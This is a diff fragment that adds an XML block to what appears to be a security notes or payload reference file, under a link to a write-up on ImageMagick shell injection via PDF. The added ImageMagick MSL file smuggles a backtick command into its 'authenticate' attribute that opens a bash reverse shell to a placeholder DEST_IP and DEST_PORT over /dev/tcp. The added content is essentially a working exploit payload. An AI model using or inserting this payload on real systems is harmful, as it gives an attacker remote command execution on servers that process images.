@@ -222,3 +222,12 @@ pkill mogrify
 
 https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html
 
+````xml
+<?xml version="1.0" encoding="UTF-8"?>
+<image authenticate='test" `bash -c "bash &>/dev/tcp/DEST_IP/DEST_PORT <&1"`;"'>
+  <read filename="test.pdf" />
+  <get width="base-width" height="base-height" />
+  <resize geometry="400x400" />
+  <write filename="out.png" />
+</image>
+````
